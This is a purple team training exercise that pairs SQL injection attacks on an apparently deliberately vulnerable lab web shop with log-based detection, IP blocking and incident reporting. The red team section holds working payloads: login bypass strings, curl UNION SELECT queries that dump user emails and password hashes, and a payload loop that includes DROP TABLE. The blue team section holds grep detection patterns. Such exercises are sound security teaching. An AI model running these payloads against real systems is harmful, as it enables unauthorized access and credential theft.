# Purple Team Exercise 01: SQL Injection Attack & Defense

## 🎯 Overview

**Duration:** 40 minutes  
**Difficulty:** ⭐ Beginner  
**OWASP Category:** A03:2021 - Injection

In this exercise, the Red Team will perform SQL injection attacks while the Blue Team simultaneously monitors, detects, and responds to the attacks in real-time.

---

## ⏱️ Timeline

| Time | Red Team Activity | Blue Team Activity |
|------|-------------------|-------------------|
| 0-5 min | Setup & reconnaissance | Setup monitoring & baseline |
| 5-20 min | SQL injection attacks | Real-time detection |
| 20-30 min | Continue exploitation | Create blocking rules |
| 30-40 min | Document findings | Block attacker & report |

---

## 🔴 Red Team Instructions

### Target
```
http://<VPS_IP>:8000
```

### Phase 1: Reconnaissance (5 minutes)

**Objective:** Identify potential SQL injection points

1. Browse the application and identify input fields
2. Find the login page and search functionality
3. Note all endpoints that accept user input

**Key Endpoints to Test:**
- `/rest/user/login` - Login form
- `/rest/products/search?q=` - Search functionality

---

### Phase 2: SQL Injection Attacks (15 minutes)

**Objective:** Exploit SQL injection vulnerabilities

#### Attack 1: Authentication Bypass

1. Navigate to: `http://<VPS_IP>:8000/#/login`
2. In the email field, try these payloads:

```sql
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
admin@juice-sh.op'--
```

3. Enter any password and click login
4. **Expected Result:** Login as admin without password

#### Attack 2: Search-Based SQL Injection

1. Use the search functionality
2. Try these payloads in the search box or URL:

```bash
# Basic test
curl "http://<VPS_IP>:8000/rest/products/search?q=test"

# SQL injection test
curl "http://<VPS_IP>:8000/rest/products/search?q='))--"

# Data extraction
curl "http://<VPS_IP>:8000/rest/products/search?q='))UNION+SELECT+1,2,3,4,5,6,7,8,9--"
```

#### Attack 3: Extract User Data

```bash
# Extract user emails and password hashes
curl "http://<VPS_IP>:8000/rest/products/search?q='))UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users--"
```

---

### Phase 3: Continue & Escalate (10 minutes)

Keep attacking to generate more logs for Blue Team detection:

```bash
# Automated attack script
for payload in "' OR 1=1--" "' UNION SELECT" "'; DROP TABLE" "admin'--"; do
    curl -s "http://<VPS_IP>:8000/rest/products/search?q=$payload" > /dev/null
    sleep 1
done
```

**Note:** If you get blocked, document when and how. This means Blue Team is doing their job!

---

### Red Team Deliverables

Document in your notes:
- [ ] Successful login bypass payload
- [ ] Data extracted (emails, hashes)
- [ ] Time you got blocked (if applicable)
- [ ] Total vulnerabilities found

---

## 🔵 Blue Team Instructions

### Phase 1: Setup Monitoring (5 minutes)

**Objective:** Establish baseline and monitoring

#### 1. Access Kibana
```
http://<VPS_IP>:5601
```

#### 2. Create Index Pattern
- Go to **Stack Management** → **Index Patterns**
- Create pattern: `filebeat-*`
- Set time field: `@timestamp`

#### 3. Open Discover View
- Go to **Discover**
- Set time range to "Last 15 minutes"
- Note normal traffic patterns

#### 4. Monitor Logs via Command Line
```bash
# Watch nginx logs in real-time
tail -f ./logs/nginx/access.log

# In another terminal, watch for SQL patterns
tail -f ./logs/nginx/access.log | grep -iE "(union|select|or.1=1|'--)"
```

---

### Phase 2: Real-Time Detection (15 minutes)

**Objective:** Detect SQL injection attacks as they happen

#### Detection Queries (Kibana)

```
# SQL Injection patterns
message:*UNION* OR message:*SELECT* OR message:*OR*1=1*
```

#### Command Line Detection

```bash
# Count SQL injection attempts
grep -ciE "(union|select|or.1=1|'--|%27)" ./logs/nginx/access.log

# Find attacker IPs
grep -iE "(union|select|or.1=1)" ./logs/nginx/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn

# Watch for successful attacks (200 responses)
grep -iE "(union|select)" ./logs/nginx/access.log | grep " 200 "
```

#### What to Look For

| Pattern | Indicates |
|---------|-----------|
| `' OR '1'='1` | Auth bypass attempt |
| `UNION SELECT` | Data extraction |
| `'--` or `#` | SQL comment injection |
| Many 401s then 200 | Successful bypass |

---

### Phase 3: Create Blocking Rules (10 minutes)

**Objective:** Block the attacker

#### 1. Identify Attacker IP
```bash
# Find the most active attacker
grep -iE "(union|select|or.1=1)" ./logs/nginx/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn | head -5
```

#### 2. Block the IP

**Option A: Using iptables**
```bash
# Block attacker IP (replace with actual IP)
sudo iptables -A INPUT -s <ATTACKER_IP> -j DROP
```

**Option B: Using nginx (add to nginx.conf)**
```bash
# Edit the nginx config
echo "deny <ATTACKER_IP>;" >> ./blue-team/config/blocked_ips.conf
```

Create the blocking config file:
```bash
# Create blocked IPs file
cat > ./blue-team/config/blocked_ips.conf << 'EOF'
# Blocked IPs - Add malicious IPs here
# deny 192.168.1.100;
EOF
```

#### 3. Apply the Block
```bash
# Reload nginx with new rules
docker exec nginx-proxy nginx -s reload
```

#### 4. Verify Block
- Tell Red Team to try again
- They should receive connection refused or timeout

---

### Phase 4: Document & Report (10 minutes)

Create an incident summary:

```
INCIDENT SUMMARY
================
Date: [DATE]
Duration: [START] - [END]

Attacker IP: [IP]
Attack Type: SQL Injection

Attacks Detected:
- Authentication bypass attempts: [COUNT]
- Data extraction attempts: [COUNT]
- Successful extractions: [COUNT]

Data Potentially Exposed:
- User emails: [YES/NO]
- Password hashes: [YES/NO]

Response Actions:
- [TIME] - Attack detected
- [TIME] - IP blocked
- [TIME] - Attack stopped

Recommendations:
1. Implement parameterized queries
2. Add Web Application Firewall
3. Rate limit login attempts
```

---

## 🟣 Debrief Questions

Discuss as a team:

1. **Red Team:** What payloads worked? What didn't?
2. **Blue Team:** How quickly did you detect the attack?
3. **Both:** What could improve detection/prevention?
4. **Both:** What real-world impact could this attack have?

---

## ✅ Success Criteria

### Red Team
- [ ] Successfully logged in via SQL injection
- [ ] Extracted at least one user's data
- [ ] Documented attack methodology

### Blue Team
- [ ] Detected SQL injection within 5 minutes
- [ ] Identified correct attacker IP
- [ ] Successfully blocked attacker
- [ ] Created incident summary
